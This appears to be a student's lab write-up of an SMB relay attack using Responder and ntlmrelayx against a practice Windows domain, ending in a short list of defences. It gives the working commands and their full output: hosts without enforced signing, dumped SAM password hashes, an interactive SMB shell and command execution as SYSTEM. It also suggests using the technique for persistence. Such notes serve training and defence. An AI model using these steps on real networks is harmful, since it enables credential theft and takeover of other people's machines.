#SMBRelay #Responder #ntlmrelayx #SMB #NTLM 
# SMB Relay Attacks
Instead of cracking hashes gathered with Responder, we can relay those hashes to machines and gain access
* Requirements
	* SMB signing must be disabled or not enforced on the target
	* Relayed user credentials must be admin on machine for any real value

Step 1: Identify Hosts Without SMB Signing
	`nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24`
* may need `-Pn` to get it to work
Step 2: Run Responder
	`sudo mousepad /etc/responder/Responder.conf`
* Turn off SMB and HTTP
Step 3: Run Responder
	`sudo responder -I eth0 -dwv`
Step 4: Set up your relay
	`sudo ntlmrelayx.py -tf targets.txt -smb2support`
* responder forwards hash to ntlmrelay and then ntlmrelay forwards hash to target
Step 5: An Event Occurs...
* cause an event by pointing to a fileshare on user account
Step 6: Win
* Other Wins
	* `sudo ntlmrelayx.py -tf targets.txt -smb2support -i`
		* gives an interactive shell!
			* `nc 127.0.0.1 11000`
	* `sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"`
		* can run commands!


Both domain users have SMB signing unenforced so we can relay to them.
```
┌─(~/Documents/PEH)─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/3)─┐
└─(13:39:53)──> nmap --script=smb2-security-mode.nse -p445 192.168.95.133 -Pn                                                               ──(Wed,Jun26)─┘
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-26 13:39 PDT
Nmap scan report for 192.168.95.133
Host is up (0.00047s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
┌─(~/Documents/PEH)─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/3)─┐
└─(13:39:58)──> nmap --script=smb2-security-mode.nse -p445 192.168.95.134 -Pn                                                               ──(Wed,Jun26)─┘
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-26 13:40 PDT
Nmap scan report for 192.168.95.134
Host is up (0.00033s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds
┌─(~/Documents/PEH)─────────────────────────────────────────────
```

start responder and confirm SMB and HTTP are off

```
┌──(root㉿kali)-[/home/kali]
└─# sudo responder -I eth0 -dwv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]
```

An Event Occurs and SAM hashes are dumped from ntlmrelay.py

```
┌─(~/Documents/PEH)─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/3)─┐
└─(13:43:55)──> ntlmrelayx.py -tf targets.txt -smb2support                                                                                  ──(Wed,Jun26)─┘
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Servers started, waiting for connections
[*] SMBD-Thread-3: Received connection from 192.168.95.133, attacking target smb://192.168.95.134
[*] Authenticating against smb://192.168.95.134 as MARVEL\fcastle SUCCEED
[*] SMBD-Thread-5: Received connection from 192.168.95.133, attacking target smb://192.168.95.133
[-] Authenticating against smb://192.168.95.133 as MARVEL\fcastle FAILED
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x845409a07e64847bff25283ec162c54d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5d232066e107f4c2c61c223dc4a2e22e:::
peterparker:1002:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Done dumping SAM hashes for host: 192.168.95.134
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

ntlmrelayx can create an interactive shell

```
┌─(~/Documents/PEH)─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/3)─┐
└─(13:49:16)──> ntlmrelayx.py -tf targets.txt -smb2support -i                                                                               ──(Wed,Jun26)─┘
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Servers started, waiting for connections
[*] SMBD-Thread-3: Received connection from 192.168.95.133, attacking target smb://192.168.95.134
[*] Authenticating against smb://192.168.95.134 as MARVEL\fcastle SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
[*] SMBD-Thread-5: Received connection from 192.168.95.133, attacking target smb://192.168.95.133
[-] Authenticating against smb://192.168.95.133 as MARVEL\fcastle FAILED
whoami
^C%                                                                                                                                                         ┌─(~/Documents/PEH)─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/3)─┐
└─(13:50:14)──> ntlmrelayx.py -tf targets.txt -smb2support -i                                                                               ──(Wed,Jun26)─┘
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Servers started, waiting for connections
[*] SMBD-Thread-3: Received connection from 192.168.95.133, attacking target smb://192.168.95.134
[*] Authenticating against smb://192.168.95.134 as MARVEL\fcastle SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
[*] SMBD-Thread-5: Received connection from 192.168.95.133, attacking target smb://192.168.95.133
[-] Authenticating against smb://192.168.95.133 as MARVEL\fcastle FAILED
```

Shell opened @ 127.0.0.1:11000, connect:

```
┌─(~)───────────────────────────────────────────────────(kali@kali:pts/5)─┐
└─(13:50:13)──> nc 127.0.0.1 11000                          ──(Wed,Jun26)─┘
Type help for list of commands
# help
# pwd
\
# shares
ADMIN$
C$
IPC$
```

ntlmrelayx can be used to run a single command (best used for persistence - adding an admin user, etc.)

```
┌─(~/Documents/PEH)─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/3)─┐
└─(13:50:14)──> ntlmrelayx.py -tf targets.txt -smb2support -i                                                                               ──(Wed,Jun26)─┘
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Servers started, waiting for connections
[*] SMBD-Thread-3: Received connection from 192.168.95.133, attacking target smb://192.168.95.134
[*] Authenticating against smb://192.168.95.134 as MARVEL\fcastle SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
[*] SMBD-Thread-5: Received connection from 192.168.95.133, attacking target smb://192.168.95.133
[-] Authenticating against smb://192.168.95.133 as MARVEL\fcastle FAILED
[-] No share selected
^C%                                                                                                                                                         ┌─(~/Documents/PEH)─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/3)─┐
└─(13:52:35)──> ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"                                                                      ──(Wed,Jun26)─┘
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Servers started, waiting for connections
[*] SMBD-Thread-3: Received connection from 192.168.95.133, attacking target smb://192.168.95.134
[*] Authenticating against smb://192.168.95.134 as MARVEL\fcastle SUCCEED
[*] SMBD-Thread-5: Received connection from 192.168.95.133, attacking target smb://192.168.95.133
[-] Authenticating against smb://192.168.95.133 as MARVEL\fcastle FAILED
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Executed specified command on host: 192.168.95.134
nt authority\system
```

`whoami` returns `nt authority\system`

# SMB Relay Attack Defenses
Mitigation Strategies
* Enable SMB Signing on all devices - KEY POINT
	* Pro: Stops the attack
	* Con: Can cause performance issues with file copies
* Disable NTLM authentication on the network
	* Pro: Stops the attack
	* Con: If Kerberos stops working, Windows defaults back to NTLM
* Account tiering:
	* Pro: Limits domain admins to specific tasks (e.g. only log onto servers with need for DA)
	* Con: Enforcing the policy may be difficult
* Local admin restriction:
	* Pro: Can prevent a lot of lateral movement
	* Con: Potential increase in the amount of service desk tickets
